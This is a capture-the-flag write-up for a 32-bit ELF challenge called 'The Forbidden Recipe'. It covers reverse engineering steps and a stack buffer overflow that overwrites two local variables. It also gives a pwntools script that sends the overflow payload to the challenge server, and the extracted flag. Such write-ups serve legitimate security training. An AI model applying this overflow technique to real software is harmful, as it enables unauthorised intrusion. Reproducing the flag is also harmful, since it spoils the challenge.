# !Kogarashi Café - The Forbidden Recipe  

**Category:** Binary Exploitation 

A final challenge that involves exploiting a stack-based buffer overflow to manipulate local variables and extract the flag.  

---

### Challenge  

**Provided File:** `forbidden_recipe`  

---

## Overview  

1. **Analyzing the Binary**  
   - Use `file forbidden_recipe` to determine the binary type:
     
     ```sh
     forbidden_recipe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c1033e4a4b053363f711f388f116277a1cbde252, not stripped
     ```
   - Run `strings forbidden_recipe` to find readable text inside:
     ```sh
     Barista: 'Ah... I see you've returned for the special blend.'
     Barista: 'The secret recipe... lost?
     ```
   - Disassemble the binary using `objdump`:
     ```sh
     objdump -d forbidden_recipe > disassembly.txt
     ```
   - Load the binary in **Ghidra** or **Binary Ninja** to reverse-engineer its logic.  

2. **Identifying the Vulnerability**  
   - The binary has a **stack-based buffer overflow** vulnerability.
   - By overflowing the buffer, we can overwrite **local variables** (`local_14` and `local_10`) with specific values.
   - This allows us to manipulate program execution and extract the flag.  

---

## Steps to Exploit  

1. **Check Binary Properties**  
   ```sh
   file forbidden_recipe  
   checksec --file=forbidden_recipe  
   strings forbidden_recipe  
   ```

2. **Reverse Engineer the Binary**  
   - Load in **Ghidra** or **Binary Ninja** to analyze the functions.
   - Identify the buffer size and which values need to be overwritten.

3. **Exploit Buffer Overflow**  
   - Send a payload that fills the buffer (32 bytes) and precisely overwrites two critical local variables.
   - Set `local_14` to `0xdecafbad` and `local_10` to `0xc0ff33` to trigger the correct execution path.  

---

## Exploit Script  

```python
from pwn import *

# Connection details
HOST = "chals1.apoorvctf.xyz"
PORT = 3002

# Establish remote connection
conn = remote(HOST, PORT)

# Wait for the prompt (adjust as needed)
conn.recvuntil(b"what will it be this time?'\n")

# Construct the payload:
# 32 bytes to fill the buffer, then:
# p32(0xdecafbad) -> overwrites local_14
# p32(0xc0ff33)  -> overwrites local_10
payload = b"A" * 32
payload += p32(0xdecafbad)  # Overwrite local_14
payload += p32(0xc0ff33)    # Overwrite local_10

# Send the payload
conn.sendline(payload)

# Receive and print the response (the flag should be in the output)
response = conn.recvall().decode()
print(response)

conn.close()
```

---

## Extracted Flag  

```
apoorvctf{d3caf_is_bad_f0r_0verfl0ws}
```

